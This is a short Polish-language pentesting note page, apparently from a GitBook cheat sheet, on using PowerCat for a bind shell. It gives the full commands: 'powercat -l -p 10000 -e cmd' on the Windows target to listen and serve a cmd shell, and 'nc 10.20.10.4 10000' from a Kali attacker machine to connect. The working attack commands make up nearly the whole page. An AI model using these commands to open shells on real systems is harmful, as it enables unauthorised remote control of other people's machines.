---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# PowerCat

{% hint style="info" %}
To stacja z Windowsem nasłuchuje, a atakujący się tam podłącza
{% endhint %}

**Win**

nasłuchujemy i przekazujemy sami shella cmd

```
powercat -l -p 10000 -e cmd
```

**Kali**

```
nc 10.20.10.4 10000
```
